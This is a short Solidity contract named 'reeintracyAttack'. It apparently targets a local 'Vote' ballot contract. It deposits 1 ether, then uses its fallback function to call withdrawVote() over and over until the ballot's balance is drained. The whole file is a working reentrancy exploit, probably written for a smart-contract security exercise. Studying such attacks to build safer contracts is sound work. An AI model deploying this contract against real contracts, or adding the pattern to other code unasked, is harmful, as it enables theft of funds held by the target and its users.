import "contracts/vote.sol";

contract reeintracyAttack {
    Vote public ballot;

    constructor(address _ballotAddress) {
        ballot = Vote(_ballotAddress);
    }

    fallback() external payable {
        if (address(ballot).balance >= 1 ether) {
            ballot.withdrawVote();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        ballot.vote{value: 1 ether}(1);
        ballot.withdrawVote();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}